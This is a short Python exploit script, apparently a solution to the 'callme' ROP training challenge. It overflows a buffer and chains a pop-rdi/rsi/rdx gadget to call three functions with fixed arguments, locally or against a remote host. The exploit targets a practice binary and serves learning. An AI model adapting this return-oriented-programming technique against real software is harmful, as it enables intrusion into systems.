#!/usr/bin/python3
from pwncus import *
from time import sleep

# context.log_level = 'debug'
exe = context.binary = ELF('./callme', checksec=False)


def GDB(): gdb.attach(p, gdbscript='''


c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

def exploit():

    pop_rdi_rsi_rdx = 0x0040093c
    ret = pop_rdi_rsi_rdx + 3
    argu1 = 0xdeadbeefdeadbeef
    argu2 = 0xcafebabecafebabe
    argu3 = 0xd00df00dd00df00d

    callme_one = 0x00400720
    callme_two = 0x00400740
    callme_three = 0x004006f0

    pl = flat(
        b'A' * 40,
        ret,
        pop_rdi_rsi_rdx,
        argu1,
        argu2,
        argu3,
        callme_one,

        pop_rdi_rsi_rdx,
        argu1,
        argu2,
        argu3,
        callme_two,

        pop_rdi_rsi_rdx,
        argu1,
        argu2,
        argu3,
        callme_three,
        )

    sla(b'> ',pl)

    interactive()

if __name__ == '__main__':
    exploit()
